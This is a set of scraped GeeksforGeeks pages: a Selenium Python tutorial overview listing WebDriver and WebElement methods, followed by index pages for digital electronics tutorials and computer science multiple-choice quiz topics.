single elements in Selenium PythonLocating multiple elements in Selenium PythonLocator Strategies – Selenium PythonAction Chains in Selenium PythonExceptions – Selenium PythonSelenium Python TutorialSelenium Basics – Components, Features, Uses and LimitationsComponents of SeleniumSelenium Python Introduction and InstallationNavigating links using get method – Selenium PythonPython – Opening links using Seleniumturtle.right() method in PythonMoviePy Composite Video – Setting starting time of single clipMoviePy – Changing Image and Time at same time of Video Clipnumpy.flipud() in PythonPython | StackLayout in Kivy using .kv filePython | AnchorLayout in Kivy using .kv filePython| AnchorLayout in KivyPython | Relative Layout in KivyAdding new column to existing DataFrame in PandasPython map() functionTaking input in PythonIterate over a list in PythonEnumerate() in PythonHow to get column names in Pandas dataframePython program to convert a list to stringReading and Writing to text files in PythonPython String | replace()Read a file line by line in Python Selenium Python Tutorial Last Updated: 10-06-2020 Selenium is a powerful tool for controlling web browsers through programs and performing browser automation. It is functional for all browsers, works on all major OS and its scripts are written in various languages i.e Python, Java, C#, etc, we will be working with Python. Selenium Tutorial covers all topics such as – WebDriver, WebElement, Unit Testing with selenium. This Python Selenium Tutorial covers Selenium from basics to advanced and professional uses. Why learn Selenium Python ? Open Source and Portable – Selenium is an open source and portable Web testing Framework. Combination of tool and DSL – Selenium is combination of tools and DSL (Domain Specific Language) in order to carry out various types of tests. Easier to understand and implement – Selenium commands are categorized in terms of different classes which make it easier to understand and implement. Less burden and stress for testers – As mentioned above, the amount of time required to do testing repeated test scenarios on each and every new build is reduced to zero, almost. Hence, the burden of tester gets reduced. Cost reduction for the Business Clients – The Business needs to pay the testers their salary, which is saved using automation testing tool. The automation not only saves time but gets cost benefits too, to the business. Selenium Basics Selenium Basics Components of Selenium Applications and Uses Features Limitations Selenium Python Basics Selenium Python Introduction and Installation Navigating links using get method Interacting with Webpage Locating single elements Locating multiple elements Locator Strategies – Selenium Python Writing Tests using Selenium Python Locating Strategies Locating Single Elements – find_element_by_id() find_element_by_name() find_element_by_xpath() find_element_by_link_text() find_element_by_partial_link_text() find_element_by_tag_name() find_element_by_class_name() find_element_by_css_selector() Locating Multiple Elements – find_elements_by_name() find_elements_by_xpath() find_elements_by_link_text() find_element_by_partial_link_text() find_elements_by_tag_name() find_elements_by_class_name() find_elements_by_css_selector() Waits Explicit waits Implicit Waits Action Chains Action Chains Basics click click_and_hold context_click double_click drag_and_drop key_down key_up move_by_offset move_to_element move_to_element_with_offset release reset_actions send_keys Advanced in Selenium Python – Handling Exceptions – Selenium Python Special Keys in Selenium Python How to handle alert prompts in Selenium Python ? Adding and Deleting Cookies in Selenium Python How to move back and forward in History using Selenium Python ? Special Keys in Selenium Python Assertion in Selenium WebDriver using TestNg Selenium Python Tricks Page Object Model (POM) Project Examples Whatsapp using Python! Browser Automation Using Selenium Facebook Login using Python Automating Happy Birthday post on Facebook using Selenium How to access popup login window in selenium using Python SMS Bomber using Selenium Selenium WebDriver Selenium Webdriver is the parent of all methods and classes used in Selenium Python. It is the driving force of Selenium that allows us to perform various operations on multiple elements on a webpage. Driver has various methods and attributes one can use to automate testing in Selenium Python. To check how to use webdriver, visit – Web Driver in Selenium Python . Various methods one can use in selenium Python are – Method Description add_cookie Adds a cookie to your current session. back Goes one step backward in the browser history. close Closes the current window. create_web_element Creates a web element with the specified element_id. delete_all_cookies Delete all cookies in the scope of the session. delete_cookie Deletes a single cookie with the given name. execute_async_script Asynchronously Executes JavaScript in the current window/frame. execute_script Synchronously Executes JavaScript in the current window/frame. forward Goes one step forward in the browser history. fullscreen_window Invokes the window manager-specific ‘full screen’ operation get_cookie Get a single cookie by name. Returns the cookie if found, None if not. get_cookies Returns a set of dictionaries, corresponding to cookies visible in the current session. get_log Gets the log for a given log type get_screenshot_as_base64 Gets the screenshot of the current window as a base64 encoded string which is useful in embedded images in HTML. get_screenshot_as_file Saves a screenshot of the current window to a PNG image file. get_screenshot_as_png Gets the screenshot of the current window as a binary data. get_window_position Gets the x, y position of the current window. get_window_rect Gets the x, y coordinates of the window as well as height and width of the current window. get_window_size Gets the width and height of the current window. implicitly_wait Sets a sticky timeout to implicitly wait for an element to be found, maximize_window Maximizes the current window that webdriver is using minimize_window Invokes the window manager-specific ‘minimize’ operation quit Quits the driver and closes every associated window. refresh Refreshes the current page. set_page_load_timeout Set the amount of time to wait for a page load to complete before throwing an error. set_script_timeout Set the amount of time that the script should wait during an execute_async_script call before throwing an error. set_window_position Sets the x, y position of the current window. (window.moveTo) set_window_rect Sets the x, y coordinates of the window as well as height and width of the current window. current_url Gets the URL of the current page. current_window_handle Returns the handle of the current window. page_source Gets the source of the current page. title Returns the title of the current page. Selenium WebElement An element can be a tag, property, or anything, it is an instance of class selenium.webdriver.remote.webelement.WebElement. After you find an element on screen using selenium, you might want to click it or find sub-elements, etc. Selenium provides methods around this WebElement of Selenium. To checkout how to use element object in selenium, visit – WebElement in Selenium Python. Various methods one can use with an element in Selenium Python are discussed below – Element Methods Description is_selected() is_selected method is used to check if element is selected or not. It returns a boolean value True or False. is_displayed() is_displayed method is used to check if element it visible to user or not. It returns a boolean value True or False. is_enabled() is_enabled method is used to check if element is enabled or not. It returns a boolean value True or False. get_property() get_property method is used to get properties of an element, such as getting text_length property of anchor tag. get_attribute() get_attribute method is used to get attributes of an element, such as getting href attribute of anchor tag. send_keys() send_keys method is used to send text to any field, such as input field of a form or even to anchor tag paragraph, etc. click() click method is used to click on any element, such as an anchor tag, a link, etc. clear() clear method is used to clear text of any field, such as input field of a form or even to anchor tag paragraph, etc. screenshot() screenshot method is used to save a screenshot of current element to a PNG file. submit() submit method is used to submit a form after you have sent data to a form. value_of_css_property() value_of_css_property method is used to get value of a css property for a element. location location method is used to get location of element in renderable canvas. screenshot_as_png screenshot_as_png method is used to gets the screenshot of the current element as binary data. parent parent method is used to get internal reference to the WebDriver instance this element was found from. size size method is used to get size of current element. tag_name tag_name method is used to get name of tag you are referring to. text text method is used to get text of current element. rect rect method is used to get a dictionary with the size and location of the element. screenshot_as_base64 screenshot_as_base64 method is used to gets the screenshot of the current element as a base64 encoded string. Attention geek! Strengthen your foundations with the Python Programming Foundation Course and learn the basics. To begin with, your interview preparations Enhance your Data Structures concepts with the Python DS Course. My Personal Notes arrow_drop_up Save Recommended Posts:Python Requests TutorialPython Tkinter TutorialPython MongoDB TutorialOpenCV Python TutorialKivy TutorialDjango TutorialPandas TutorialSelenium Python TricksSelenium Base Mini Project Using PythonPython | SMS Bomber using SeleniumNon blocking wait in selenium using PythonPython | Automating Happy Birthday post on Facebook using SeleniumHow to access popup login window in selenium using PythonWhy do people prefer Selenium with Python?Python | Automate Google Search using SeleniumHow to install Selenium in PythonSelenium Python BasicsPython - Opening links using SeleniumFlight-price checker using Python and SeleniumHow to take screenshot using Selenium in Python ? Article Tags : Pythonselenium thumb_up 2 To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page numpy.dtype.subdtype() function – Python Next last_page PyQt5 QCalendarWidget – Setting Maximum Height Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Python Python Dictionaryappend() and extend() in PythonPython String | split()__init__ in PythonPython Lists More related articles in Python Python | Get a list as input from userself in Python classDifferent ways to create Pandas Dataframesum() function in Pythonisupper(), islower(), lower(), upper() in Python and their applications room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Digital Electronics and Logic Design Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Introduction of Boolean Algebra and Logic Gatesexpand_moreDigital Electronics and Logic Design TutorialsIntroduction of Logic GatesProperties of Boolean AlgebraMinimization of Boolean FunctionsRepresentation of Boolean FunctionsCanonical and Standard FormFunctional Completeness in Digital LogicIntroduction of K-Map (Karnaugh Map)Various Implicants in K-MapPDNF and PCNF in Discrete MathematicsVariable Entrant Map (VEM) in Digital LogicConsensus Theorem in Digital LogicDifference between combinational and sequential circuitCombinational Circuitsexpand_moreHalf Adder in Digital LogicFull Adder in Digital LogicHalf Subtractor in Digital LogicFull Subtractor in Digital LogicHalf Adder and Half Subtractor using NAND NOR gatesEncoders and Decoders in Digital LogicEncoder in Digital LogicBinary Decoder in Digital LogicCombinational circuits using DecoderMultiplexers in Digital LogicCarry Look-Ahead AdderParallel Adder and Parallel SubtractorBCD Adder in Digital LogicMagnitude Comparator in Digital LogicBCD to 7 Segment DecoderProgrammable Logic ArrayProgramming Array LogicClassification and Programming of Read-Only Memory (ROM)Sequential Circuitsexpand_moreIntroduction of Sequential CircuitsFlip-flop types, their Conversion and ApplicationsSynchronous Sequential Circuits in Digital LogicCounters in Digital LogicRing Counter in Digital Logicn-bit Johnson Counter in Digital LogicRipple Counter in Digital LogicDesign counter for given sequenceMaster-Slave JK Flip FlopAsynchronous Sequential CircuitsShift Registers in Digital LogicDesign 101 sequence detector (Mealy machine)Amortized analysis for increment in counterNumber Representation and Computer Airthmeticexpand_moreNumber System and Base ConversionsCode Converters – BCD(8421) to/from Excess-3Code Converters – Binary to/from Gray CodeProgram for Decimal to Binary ConversionProgram for Binary To Decimal ConversionProgram for Decimal to Octal ConversionProgram for Octal to Decimal ConversionProgram for Hexadecimal to DecimalComputer Arithmetic | Set – 1Computer Arithmetic | Set – 2Introduction of Floating Point RepresentationWhat’s difference between 1’s Complement and 2’s Complement?Computer Organization | Booth’s AlgorithmRestoring Division Algorithm For Unsigned IntegerNon-Restoring Division For Unsigned IntegerDLD GATE Questionsexpand_moreDigital Logic & Number representationNumber Representation Digital Electronics and Logic Design Tutorials Recent Articles on Digital Electronics and Logic Design Topics : Number System and Representation Programs Boolean Algebra and Logic Gates Gate Level Minimization Combinational Logic Circuits Flip-Flops and Sequential Circuits Register and Counters Memory and Programmable Logic Data Communication Quick Links Number System and Representation : Binary representations Number System and Base Conversions Floating Point Representation Programs : Program for Binary To Decimal Conversion Program for Decimal to Binary Conversion Program for decimal to octal conversion Program for octal to decimal conversion Program for hexadecimal to decimal Boolean Algebra and Logic Gates : Properties of Boolean algebra Representation of Boolean Functions Canonical and Standard Form Functional Completeness Logic Gates Gate Level Minimization : K-Map(Karnaugh Map) Implicants in K-Map 5 variable K-Map Variable entrant map (VEM) Minimization of Boolean Functions Consensus theorem Combinational Logic Circuits : Half-Adder Half-Subtractor Half-Adder and Half-Subtractor using NAND NOR Gates Full-Adder Full Subtractor Code Converters – BCD(8421) to/from Excess-3 Code Converters – Binary to/from Gray Code Code Converters – BCD to 7 Segment Decoder Parallel Adder & Parallel Subtractor Carry Look-Ahead Adder Magnitude Comparator BCD Adder Encoders and Decoders Encoder Binary Decoder Combinational circuits using Decoder Multiplexers Static Hazards Flip-Flops and Sequential Circuits : Latches One bit memory cell Flip-Flops(Types and Conversions) Master Slave JK Flip Flop Introduction of Sequential Circuits Synchronous Sequential Circuits Asynchronous Sequential Circuits Difference between combinational and sequential circuit RTL (Register Transfer Level) design vs Sequential logic design Difference between Synchronous and Asynchronous Sequential Circuits Register and Counters : Counters Design counter for given sequence n-bit Johnson Counter Amortized analysis for increment in counter Ripple Counter Digital Logic | Ring Counter Shift Registers Design 101 sequence detector Universal Shift Register RTL (Register Transfer Level) design vs Sequential logic design Verilog Data Types Memory and Programmable Logic : Read-Only Memory (ROM) | Classification and Programming Programmable Logic Array Programming Array Logic RAM vs ROM Operational Amplifier (op-amp) Data Communication : Block Coding Difference between Unipolar, Polar and Bipolar Line Coding Difference between Broadband and Baseband Transmission Transmission Impairment What is Scrambling? Analog to Analog Conversion (Modulation) Analog to digital conversion Digital to Analog Conversion Difference Between Digital And Analog System Quick Links : Last Minute Notes (LMNs) Quizzes on Digital Electronics and Logic Design Practice Problems on Digital Electronics and Logic Design ! Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python Most Visited Articles Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ?How To Create a Countdown Timer Using Python? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Practice | GeeksforGeeks | A computer science portal for geeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit Please Login first to view the details. Click here to Login

Topic wise multiple choice questions in computer science Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Topic wise multiple choice questions in computer science C Programming Mock Tests C++ Programming Mock Tests Java Programming Mock Tests Python Programming Mock Tests GATE Mock Tests Data Structures Mock Tests Algorithms Mock Tests Operating Systems Mock Tests DBMS Mock Tests Compiler Design Mock Tests Computer Networks Mock Tests Theory of Computation Mock Tests Computer Organization and Architecture Engineering Mathematics Aptitude Mock Tests CS Interview Questions C Programming Mock Tests Input and Output Operators Loops & Control Structure Structure & Union Macro & Preprocessor Arrays Pointer Basics String Functions Storage Classes and Type Qualifiers Data Types Dynamic Memory Allocation Misc Advanced Pointer Variable Declaration and Scope File Handling C Quiz – 101 C Quiz – 102 C Quiz – 103 C Quiz – 104 C Quiz – 105 C Quiz – 106 C Quiz – 107 C Quiz – 108 C Quiz – 109 C Quiz – 110 C Quiz – 111 C Quiz – 112 Data Structures Mock Tests Linked List Stack Queue Binary Trees Binary Search Trees Balanced Binary Search Trees Graph Hash Array Misc B and B+ Trees Heap Tree Traversals Algorithms Mock Tests Analysis of Algorithms Sorting Divide and Conquer Greedy Algorithms Dynamic Programming Backtracking Misc NP Complete Searching Analysis of Algorithms (Recurrences) Recursion Bit Algorithms Graph Traversals Graph Shortest Paths Graph Minimum Spanning Tree Operating Systems Mock Tests Process Management Memory Management Input Output Systems UNIX CPU Scheduling Deadlock C++ Programming Mock Tests Constructors References Class and Object Misc C++ Destructors Operator Overloading this pointer Function Overloading and Default Arguments Static Keyword friend keyword Inheritance const keyword new and delete Virtual Functions Templates Exception Handling Java Programming Mock Tests Inheritance Abstract Class and Interface Arrays Data Types Constructors Exception Handling Packages Class and Object Functions final keyword Operators Python Programming Mock Tests Functions Operators Miscellaneous Data Type Output GATE Mock Tests GATE CS 2012 GATE CS 2013 GATE CS 2011 GATE CS 2010 GATE-CS-2009 GATE CS 2008 GATE IT 2008 GATE-CS-2007 GATE-IT-2007 GATE-CS-2006 GATE-IT-2006 GATE-CS-2014-(Set-1) GATE-CS-2014-(Set-2) GATE-CS-2014-(Set-3) GATE-CS-2005 GATE-IT-2005 GATE-CS-2004 GATE-IT-2004 GATE-CS-2003 GATE-CS-2002 GATE-CS-2001 GATE-CS-2000 GATE-CS-2015 (Mock Test) GATE-CS-2015 (Set 1) GATE-CS-2015 (Set 2) GATE-CS-2015 (Set 3) GATE-CS-2016 (Set 1) GATE-CS-2016 (Set 2) DBMS Mock Tests ER and Relational Models Database Design (Normal Forms) SQL(29) Transactions and concurrency control File structures Compiler Design Mock Tests Lexical analysis Parsing and Syntax directed translation Code Generation and Optimization Computer Networks Mock Tests Data Link Layer Network Layer IP Addressing Transport Layer Misc Topics in Computer Networks Application Layer Network Security Theory of Computation Mock Tests Regular languages and finite automata Context free languages and Push-down automata Recursively enumerable sets and Turing machines Undecidability Aptitude Mock Tests Puzzles Probability Arithmetic Aptitude Arithmetic Aptitude 3 Arithmetic Aptitude 5 Numbers Work and Wages English General Aptitude Arithmetic Aptitude 2 Arithmetic Aptitude 4 Arithmetic Aptitude 6 LCM HCF Computer Organization and Architecture Digital Logic & Number representation Computer Organization and Architecture Number Representation Microprocessor Other Topics in Computer Science Software Engineering HTML and XML Engineering Mathematics Set Theory & Algebra Linear Algebra Numerical Methods and Calculus Graph Theory Combinatorics Propositional and First Order Logic. CS Interview Questions C Interview Questions | Set 1 C Interview Questions | Set 2 C++ Interview Questions Data Structures Interview Questions Computer Networks Interview Questions Algorithm Interview Questions DBMS Interview Questions Operating Systems Interview Questions OOP Interview Questions My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Topic wise multiple choice questions in computer science Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Topic wise multiple choice questions in computer science C Programming Mock Tests C++ Programming Mock Tests Java Programming Mock Tests Python Programming Mock Tests GATE Mock Tests Data Structures Mock Tests Algorithms Mock Tests Operating Systems Mock Tests DBMS Mock Tests Compiler Design Mock Tests Computer Networks Mock Tests Theory of Computation Mock Tests Computer Organization and Architecture Engineering Mathematics Aptitude Mock Tests CS Interview Questions C Programming Mock Tests Input and Output Operators Loops & Control Structure Structure & Union Macro & Preprocessor Arrays Pointer Basics String Functions Storage Classes and Type Qualifiers Data Types Dynamic Memory Allocation Misc Advanced Pointer Variable Declaration and Scope File Handling C Quiz – 101 C Quiz – 102 C Quiz – 103 C Quiz – 104 C Quiz – 105 C Quiz – 106 C Quiz – 107 C Quiz – 108 C Quiz – 109 C Quiz – 110 C Quiz – 111 C Quiz – 112 Data Structures Mock Tests Linked List Stack Queue Binary Trees Binary Search Trees Balanced Binary Search Trees Graph Hash Array Misc B and B+ Trees Heap Tree Traversals Algorithms Mock Tests Analysis of Algorithms Sorting Divide and Conquer Greedy Algorithms Dynamic Programming Backtracking Misc NP Complete Searching Analysis of Algorithms (Recurrences) Recursion Bit Algorithms Graph Traversals Graph Shortest Paths Graph Minimum Spanning Tree Operating Systems Mock Tests Process Management Memory Management Input Output Systems UNIX CPU Scheduling Deadlock C++ Programming Mock Tests Constructors References Class and Object Misc C++ Destructors Operator Overloading this pointer Function Overloading and Default Arguments Static Keyword friend keyword Inheritance const keyword new and delete Virtual Functions Templates Exception Handling Java Programming Mock Tests Inheritance Abstract Class and Interface Arrays Data Types Constructors Exception Handling Packages Class 